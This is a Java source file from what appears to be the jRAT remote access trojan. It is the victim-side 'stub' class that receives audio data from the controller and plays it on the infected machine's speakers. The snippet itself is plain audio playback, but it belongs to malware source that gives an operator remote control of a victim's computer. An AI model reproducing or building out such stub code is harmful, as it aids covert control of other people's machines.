package io.jrat.stub.packets.incoming;

import io.jrat.common.Sound;
import io.jrat.stub.Connection;

import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.DataLine;
import javax.sound.sampled.SourceDataLine;

public class Packet83ClientDownloadSound extends AbstractIncomingPacket {

	private static DataLine.Info info;
	private static SourceDataLine line;

	private static boolean initialized;

	@Override
	public void read(Connection con) throws Exception {
		int quality = con.readInt();
		
		if (!initialized) {
			AudioFormat format = Sound.getFormat(quality);
			info = new DataLine.Info(SourceDataLine.class, format);
			if (!AudioSystem.isLineSupported(info)) {
				throw new Exception("Sound line is not supported");
			}
			line = (SourceDataLine) AudioSystem.getLine(info);
			line.open(format);
			line.start();
			initialized = true;
		}

		int size = con.readInt();
		
		byte[] data = new byte[size];

		con.getDataInputStream().readFully(data);

		line.write(data, 0, data.length);
		
	}

	public void close() {
		if (line != null) {
			line.close();
		}
	}

}
